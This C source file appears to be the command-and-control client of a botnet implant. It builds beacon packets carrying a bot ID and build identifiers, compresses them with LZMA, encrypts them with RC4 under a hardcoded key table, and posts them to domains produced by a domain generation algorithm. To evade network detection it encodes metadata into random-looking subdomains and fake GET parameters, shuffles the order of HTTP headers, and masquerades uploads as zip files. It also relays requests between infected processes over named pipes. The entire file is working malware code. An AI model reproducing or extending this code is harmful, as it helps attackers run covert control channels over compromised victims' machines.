#include "../../0lib/code/zmodule.h"
#include "common.h"
#include "controller.h"
#include "domains.h"
#include "ztable.h"

typedef struct _request_info
{
    LPSTREAM pStream;
    FnCtrlResponseCallback fnCtrlResponseCallback;
} request_info_t;

int  _initNetworkPipeComplete = 0;

LPSTREAM __stdcall ctrl_init_stream(uint32_t requestType)
{
    LPSTREAM pStream = NULL;
    if (SUCCEEDED(stream_create(&pStream))) {
        stream_write_dword(pStream, requestType); // Тип запроса.
        stream_write_dword(pStream, BUILD_ID);
        stream_write_dword(pStream, SUB_ID);
        stream_write_dword(pStream, PLATFORM_ID);
        stream_write_binary_string(pStream, _pZmoduleBlock->botId, sizeof(_pZmoduleBlock->botId));
    }

    return pStream;
}

int __stdcall internal_ctrl_finish_stream(LPSTREAM pStream, uint32_t* pOrigSize)
{
    int ret = 0;
    CLzmaEncProps props;
    uint32_t inSize, outSize;
    uint8_t* inBuffer;
    uint8_t* outBuffer;
    unsigned propsSize = LZMA_PROPS_SIZE;
    DWORD dwWritten = 0;
    HGLOBAL hGlobal;

    // Записываем контрольную сумму.
    stream_write_crc64(pStream);

    *pOrigSize = stream_get_length(pStream);

    if (SUCCEEDED(fn_GetHGlobalFromStream(pStream, &hGlobal))) {
        inBuffer = (uint8_t*)fn_GlobalLock(hGlobal);
        if (inBuffer != NULL) {
            // Сжимаем данные.
            inSize = stream_get_length(pStream);
            outSize = inSize + inSize / 3 + 128 - LZMA_PROPS_SIZE;

            lzma_encprops_init(&props);
            props.dictSize = 1048576; // 1 MB
            outBuffer = memory_alloc(outSize);

            ret = (lzma_encode(&outBuffer[LZMA_PROPS_SIZE], &outSize, inBuffer, inSize, &props, outBuffer, &propsSize) == ERR_OK);
            fn_GlobalUnlock(hGlobal);
        }
    }

    if (ret) {
        stream_clear(pStream);
        stream_write(pStream, outBuffer, outSize + propsSize);
        // Шифруем данные.
        stream_arc4(pStream, ztable, sizeof(ztable));
    }

    return ret;
}

void internal_ctrl_alloc_cb(async_handle_t* handle, size_t suggested_size, async_buf_t* buf)
{
    buf->len = suggested_size;
    buf->base = memory_alloc(suggested_size);
}

// server side


//const char KEY[] = "fyodsfatfih78tr38e782ydudfu";
//const int KEY_LEN = sizeof(KEY) - 1;
//
//uint8_t* gConfigBUffer = NULL;
//
//void internal_servercomm_get_next_domain(servercomm_request_t* pCtrlReq)
//{
//    pCtrlReq->domain = gpURLs[_InterlockedIncrement((volatile LONG*)&pCtrlReq->internalDomainIndex) % URL_COUNT];
//}

wchar_t* internal_obfuscate_data(const wchar_t* data)
{
    int i, len = fn_lstrlenW(data);
    wchar_t* obfData = zs_new_with_len(NULL, len * 3 + 1);
    wchar_t* ptr = obfData;
    static const char symTable[36] = {'0','1','2','3','4','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','5','6','7','8','9'};

    for (i = 0; i < len; ++i) {
        int rndOffset = utils_random() % 21;
        wchar_t ch = (wchar_t)('a' + rndOffset);
        *(ptr++) = ch;
        *(ptr++) = (wchar_t)symTable[((data[i] & 0x0F) + rndOffset)];
        *(ptr++) = (wchar_t)symTable[(((data[i] >> 4) & 0x0F) + rndOffset)];
    }

    zs_update_length(obfData);

    return obfData;
}

void internal_decompose_into_params(const wchar_t* str, wchar_t* params)
{
    int strLen = fn_lstrlenW(str);
    int paramSize = 2 + (utils_random() % (strLen / 2));
    int paramNameSize = utils_random() % paramSize;

    if (paramNameSize == 0) {
        paramNameSize = 1;
    }

    if (params[0] != L'\0') {
        fn_lstrcatW(params, L"&");
    }

    fn_lstrcpynW(params + fn_lstrlenW(params), str, paramNameSize + 1);
    fn_lstrcatW(params, L"=");
    fn_lstrcpynW(params + fn_lstrlenW(params), str + paramNameSize, paramSize - paramNameSize + 1);

    str += paramSize;
    if (fn_lstrlenW(str) < 4) {
        fn_lstrcatW(params, str);
        return;
    }

    internal_decompose_into_params(str, params);
}

wchar_t* internal_obfuscate_data_as_get_params(const wchar_t* data)
{
    int dummyNum = 3 + utils_random() % 5;
    wchar_t* obfId = (wchar_t*)memory_alloc(1024);
    wchar_t* params = (wchar_t*)zs_new_with_len(NULL, 512);
    wchar_t* ptr = obfId;
    wchar_t* dataPtr = data;
    int i;

    *(ptr++) = (L'a' + dummyNum); // количество бесполезных символов между эффективными.
    for (; *dataPtr != L'\0'; ++dataPtr) {
        int k;
        *(ptr++) = *dataPtr;
        for (k = 0; k < dummyNum; ++k) {
            if (utils_random() % 2) {
                *(ptr++) = (L'0' + (utils_random() % 10));
            }
            else {
                *(ptr++) = (L'a' + (utils_random() % 26));
            }
        }
    }

    internal_decompose_into_params(obfId, params);

    memory_free(obfId);

    zs_update_length(params);

    return params;
}

wchar_t* internal_obfuscate_into_host(const wchar_t* data)
{
    wchar_t* obfData = internal_obfuscate_data(data);
    wchar_t* domain = zs_new_with_len(NULL, 1024);
    int obfDataLen = zs_length(obfData);

    int domain3Num = 3 + utils_random() % ((obfDataLen >> 1) - 2);

    fn_lstrcpyW(domain, L"http://");
    fn_lstrcpynW(domain + fn_lstrlenW(domain), obfData, domain3Num + 1);
    fn_lstrcatW(domain, L".");
    fn_lstrcpynW(domain + fn_lstrlenW(domain), obfData + domain3Num, obfDataLen - domain3Num + 1);
    fn_lstrcatW(domain, domains_get_random_root_zone());

    zs_free(obfData);

    zs_update_length(domain);
    return domain;
}

int internal_ctrl_do_real_request(ctrl_request_t* pCtrlReq, LPSTREAM pStream)
{
    int ret = 0;
    wchar_t* httpURL = NULL;
    wchar_t* httpHeaders = NULL;
    wchar_t data[128];
    int origRequestType = 0;
    uint32_t origSize;
    LPSTREAM pDataStream = NULL;

    if (pCtrlReq->requestType != REQUEST_CHECK_INTERNET) {
        if (!internal_ctrl_finish_stream(pStream, &origSize)) {
            return ret;
        }
    }

    // Проверяем, наступил ли новый период (новые субдомены будут сгенерированны автоматом после возврата из функции).
    if (domains_generate_names_if_needed()) {
        // Сбрасываем индекс текущего субимени - начинаем сначала.
        _pZmoduleBlock->subNameIndex = 0;
    }

    _pZmoduleBlock->noInternet = 1;

    do {
again_request:
        if (pCtrlReq->requestType != REQUEST_CHECK_INTERNET) {
#define HEADERS_COUNT 5
            wchar_t* obfData;
            wchar_t sValue[32];
            uint32_t i, indexes[HEADERS_COUNT];
            char boundary[22];
            wchar_t wBoundary[22];
            char paramname[22];
            wchar_t* wParamname;
            char filename[22 + 4];

            if (FAILED(stream_create(&pDataStream))) {
                return ret;
            }

#ifdef _DEBUG
            httpURL = zs_new(L"http://127.0.0.1:8080/");
#else
            httpURL = domains_get_full_url(); // zs_new(L"http://www.pdsfsfsdfsdf.ro/");
#endif // _DEBUG

            for (i = 0; i < HEADERS_COUNT; ++i) {
                indexes[i] = i;
            }

            // размешиваем индексы случайным образом.
            for (i = 0; i < (HEADERS_COUNT << 1); ++i) {
                uint32_t index1;
                uint32_t index2;
                uint32_t temp;
                do {
                    index1 = utils_random() % HEADERS_COUNT;
                    index2 = utils_random() % HEADERS_COUNT;
                } while (index1 == index2);

                temp = indexes[index1];
                indexes[index1] = indexes[index2];
                indexes[index2] = temp;
            }

            utils_str_random(boundary, 7 + (utils_random() % 15));
            utils_utf8_to_utf16(boundary, wBoundary, 22);
            //utils_str_random(paramname, 7 + (utils_random() % 15));
            utils_str_random(filename, 7 + (utils_random() % 15));
            fn_lstrcatA(filename, ".zip");

            fn_wsprintfW(sValue, L"%u", BUILD_ID);
            wParamname = internal_obfuscate_data(sValue);
            utils_utf16_to_utf8(wParamname, zs_length(wParamname) + 1, paramname, sizeof(paramname));
            zs_free(wParamname);

            stream_write(pDataStream, "--", sizeof("--") - 1);
            stream_write(pDataStream, boundary, fn_lstrlenA(boundary));
            stream_write(pDataStream, "\r\nContent-Disposition: form-data; name=\"", sizeof("\r\nContent-Disposition: form-data; name=\"") - 1);
            stream_write(pDataStream, paramname, fn_lstrlenA(paramname));
            stream_write(pDataStream, "\"; filename=\"", sizeof("\"; filename=\"") - 1);
            stream_write(pDataStream, filename, fn_lstrlenA(filename));
            stream_write(pDataStream, "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n", sizeof("\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n") - 1);

            stream_data_t* pStreamData = stream_lock(pStream);
            stream_write(pDataStream, pStreamData->buffer, pStreamData->streamSize);
            stream_unlock(pStreamData);

            stream_write(pDataStream, "\r\n--", sizeof("\r\n--") - 1);
            stream_write(pDataStream, boundary, fn_lstrlenA(boundary));
            stream_write(pDataStream, "--\r\n", sizeof("--\r\n") - 1);
           
            httpclient_init(&pCtrlReq->httpClient, L"POST", pDataStream);
            
            fn_wsprintfW(sValue, L"%u", pCtrlReq->requestType);
            pCtrlReq->httpClient.httpHost = internal_obfuscate_into_host(sValue);

            httpHeaders = zs_new("");

            for (i = 0; i < HEADERS_COUNT; ++i) {
                switch (indexes[i]) {
                    case 0: {
                        fn_wsprintfW(sValue, L"%u", origSize);
                        obfData = internal_obfuscate_data_as_get_params(sValue);
                        httpHeaders = zs_cat(httpHeaders, L"Referer: ");
                        httpHeaders = zs_cat(httpHeaders, pCtrlReq->httpClient.httpHost);
                        httpHeaders = zs_cat(httpHeaders, L"/?");
                        httpHeaders = zs_cat(httpHeaders, obfData);
                        httpHeaders = zs_cat(httpHeaders, L"\r\n");
                        zs_free(obfData);
                        break;
                    }
                    case 1: {
                        httpHeaders = zs_cat(httpHeaders, L"Accept: text/html,application/xhtml+xml,application/xml,*/*\r\n");
                        break;
                    }
                    case 2: {
                        httpHeaders = zs_cat(httpHeaders, L"Content-Type: multipart/form-data; boundary=");
                        httpHeaders = zs_cat(httpHeaders, wBoundary);
                        httpHeaders = zs_cat(httpHeaders, L"\r\n");
                        break;
                    }
                    case 3: {
                        httpHeaders = zs_cat(httpHeaders, L"Connection: close\r\n");
                        break;
                    }
                    case 4: {
                        httpHeaders = zs_cat(httpHeaders, L"Content-Length: ");
                        httpHeaders = zs_catprintf(httpHeaders, L"%u\r\n", stream_get_length(pDataStream));
                        break;
                    }
                }
            }
        }
        else {
            httpclient_init(&pCtrlReq->httpClient, L"GET", NULL);

            httpURL = zs_new(L"http://www.update.microsoft.com");
            httpHeaders = zs_new(L"Accept: text/html,application/xhtml+xml,application/xml,*/*\r\n");
        }
        pCtrlReq->httpClient.httpHeaders = httpHeaders;

        ret = httpclient_send_request(&pCtrlReq->httpClient, httpURL);
        if (pCtrlReq->requestType != REQUEST_CHECK_INTERNET) {
            if (pCtrlReq->httpClient.httpStatusCode == NULL) {
                if (_pZmoduleBlock->noInternet) {
                    stream_free(pDataStream);
                    zs_free(httpURL);
                    httpclient_done(&pCtrlReq->httpClient);
                    origRequestType = pCtrlReq->requestType;
                    pCtrlReq->requestType = REQUEST_CHECK_INTERNET;
                    goto again_request;
                }
                else {
                    if (domains_next_one()) {
                        stream_free(pDataStream);
                        zs_free(httpURL);
                        httpclient_done(&pCtrlReq->httpClient);
                        goto again_request;
                    }
                    else {
                        break;
                    }
                }
            }
            else if (fn_lstrcmpiW(pCtrlReq->httpClient.httpStatusCode, L"200")) {
                break;
            }
        }
        else {
            if (ret) {
                _pZmoduleBlock->noInternet = 0;
            }

            if (origRequestType == 0) {
                break;
            }

            if (!_pZmoduleBlock->noInternet && domains_next_one()) {
                zs_free(httpURL);
                httpclient_done(&pCtrlReq->httpClient);
                pCtrlReq->requestType = origRequestType;
                goto again_request;
            }
        }

        if (!ret || pCtrlReq->httpClient.responseByteCount <= 0) {
            break;
        }

        _pZmoduleBlock->noInternet = 0;

        if (pCtrlReq->httpClient.responseByteCount != pCtrlReq->httpClient.responseByteCountReceived || pCtrlReq->httpClient.responseByteCountReceived <= 4) {
            ret = 0;
            break;
        }

#define COMPRESSION_FLAG 0x80000000
#define ENCRYPTION_FLAG 0x40000000

        uint8_t* outBuffer = 0;
        uint32_t outSize = 0;
        uint32_t flags = *(uint32_t*)pCtrlReq->httpClient.pResponse;

        if (flags & ENCRYPTION_FLAG) {
            arc4_crypt_self(pCtrlReq->httpClient.pResponse + sizeof(uint32_t), pCtrlReq->httpClient.responseByteCountReceived - sizeof(uint32_t), ztable, sizeof(ztable));
        }

        if (flags & COMPRESSION_FLAG) {
            ret = lzma_auto_decode(pCtrlReq->httpClient.pResponse + sizeof(uint32_t), pCtrlReq->httpClient.responseByteCountReceived - sizeof(uint32_t), &outBuffer, &outSize);
            if (!ret) {
                break;
            }
        }
        else {
            outSize = pCtrlReq->httpClient.responseByteCountReceived - sizeof(uint32_t);
            outBuffer = memory_alloc(outSize);
            __movsb(outBuffer, pCtrlReq->httpClient.pResponse + sizeof(uint32_t), outSize);
        }


    } while (0);

    stream_free(pDataStream);

    zs_free(httpURL);
    httpclient_done(&pCtrlReq->httpClient);

    return ret;
}

void internal_ctrl_server_read_cb(async_stream_t* stream, ssize_t nread, const async_buf_t* buf)
{
    if (nread >= 0) {
        uint32_t realStrSize, readedStrSize;
        LPSTREAM pStream = (LPSTREAM)stream->data;
        if (nread > 0) {
            if (pStream == NULL) {
                if (SUCCEEDED(stream_create(&pStream))) {
                    stream_write(pStream, buf->base, nread);
                }
            }
            else {
                stream_write(pStream, buf->base, nread);
            }
        }

        if (pStream != NULL) {
            readedStrSize = stream_get_length(pStream);
            if (readedStrSize > sizeof(uint32_t)) {
                int status = 1;
                int ret, requestType;
                ctrl_request_t ctrlRequest;

                // Мы получили весь буфер, обрабатываем запрос.
                stream_seek_offset(pStream, 0, STREAM_SEEK_SET);
                requestType = stream_safe_read_dword(pStream, 0, &status);

                __stosb((uint8_t*)&ctrlRequest, 0, sizeof(ctrl_request_t));
                ctrlRequest.requestType = requestType;
                ret = internal_ctrl_do_real_request(&ctrlRequest, pStream);
                stream_free(pStream);
            }
        }
        memory_free(buf->base);
    }
    else {
        async_close((async_handle_t*)stream, NULL);
        uint8_t* buf = memory_alloc(1024);

        memory_free(buf);
    }
}

void internal_ctrl_connection_cb(async_stream_t* server, int status)
{
    if (status == 0) {
        async_pipe_t* client = (async_pipe_t*)memory_alloc(sizeof(async_pipe_t));
        async_pipe_init(async_default_loop(), client, 0);
        if (async_accept(server, (async_stream_t*)client) == 0) {
            async_read_start((async_stream_t*)client, internal_ctrl_alloc_cb, internal_ctrl_server_read_cb);
        }
        else {
            async_close((async_handle_t*)client, NULL);
        }
    }
}

void __stdcall ctrl_init_network_pipe(void)
{
    if (!_initNetworkPipeComplete) {
        char* ctrlPipeName = possessor_get_pipe_name(CONTROLLER_HASH);

        async_pipe_init(async_default_loop(), &_pZmoduleBlock->ctrlPipe, 0);
        if (async_pipe_bind(&_pZmoduleBlock->ctrlPipe, ctrlPipeName) == 0) {
            if (async_listen((async_stream_t*)&_pZmoduleBlock->ctrlPipe, 64, internal_ctrl_connection_cb) == 0) {
                _initNetworkPipeComplete = 1;
            }
        }

        memory_free(ctrlPipeName);
    }
}

// client side

void internal_ctrl_close_cb(async_handle_t* handle)
{
    memory_free(handle->data);
    memory_free(handle);
}

void internal_ctrl_client_read_cb(async_stream_t* stream, ssize_t nread, const async_buf_t* buf)
{
    request_info_t* pReqInfo = (request_info_t*)stream->data;

    if (nread >= 0) {
        pReqInfo->fnCtrlResponseCallback(buf->base, (uint32_t)nread);
    }
    else {
        async_close(stream->data, internal_ctrl_close_cb);
    }

    memory_free(buf->base);
}

void internal_ctrl_write_cb(async_write_t* req, int status)
{
    if (status == 0) {
        if (async_read_start(req->handle, internal_ctrl_alloc_cb, internal_ctrl_client_read_cb) != 0) {
            goto error;
        }
    }
    else {
        goto error;
    }

    return;

error:
    async_close((async_handle_t*)req->handle, internal_ctrl_close_cb);
}

void internal_ctrl_connect_cb(async_connect_t* req, int status)
{
    request_info_t* pReqInfo = (request_info_t*)req->handle->data;

    if (status == 0) {
        async_write_t* pAsyncWrite = (async_write_t*)memory_alloc(sizeof(async_write_t));
        async_buf_t buf;
        
        uint32_t streamSize = stream_get_length(pReqInfo->pStream);
        uint8_t* buffer = memory_alloc(streamSize);
        stream_goto_begin(pReqInfo->pStream);
        stream_read(pReqInfo->pStream, buffer, streamSize);
        stream_free(pReqInfo->pStream);
        pReqInfo->pStream = NULL;

        buf.base = buffer;
        buf.len = streamSize;

        if (async_write(pAsyncWrite, req->handle, &buf, 1, internal_ctrl_write_cb) != 0) {
            goto error;
        }
    }
    else {
        goto error;
    }

    return;

error:
    stream_free(pReqInfo->pStream);
    async_close((async_handle_t*)req->handle, internal_ctrl_close_cb);
}

void internal_ctrl_request_cb(async_work_t* req)
{
    async_connect_t* pPipeConnect = (async_connect_t*)memory_alloc(sizeof(async_connect_t));
    async_pipe_t* pPipe = (async_pipe_t*)memory_alloc(sizeof(async_pipe_t));
    char* ctrlPipeName = possessor_get_pipe_name(CONTROLLER_HASH);

    async_pipe_init(async_default_loop(), pPipe, 0);
    pPipe->data = req->data;
    async_pipe_connect(pPipeConnect, pPipe, ctrlPipeName, internal_ctrl_connect_cb);

    memory_free(ctrlPipeName);
}

void internal_ctrl_after_controller_request_cb(async_work_t* req, int status)
{
    memory_free(req);
}

void __stdcall ctrl_do_request(LPSTREAM pStream, FnCtrlResponseCallback fnCtrlResponseCallback)
{
    request_info_t* pRequestInfo = (request_info_t*)memory_alloc(sizeof(request_info_t));
    async_work_t* pCtrlRequestWork = (async_work_t*)memory_alloc(sizeof(async_work_t));

    pRequestInfo->pStream = pStream;
    pRequestInfo->fnCtrlResponseCallback = fnCtrlResponseCallback;

    pCtrlRequestWork->data = pRequestInfo;
    async_queue_work(async_default_loop(), pCtrlRequestWork, internal_ctrl_request_cb, internal_ctrl_after_controller_request_cb);
}
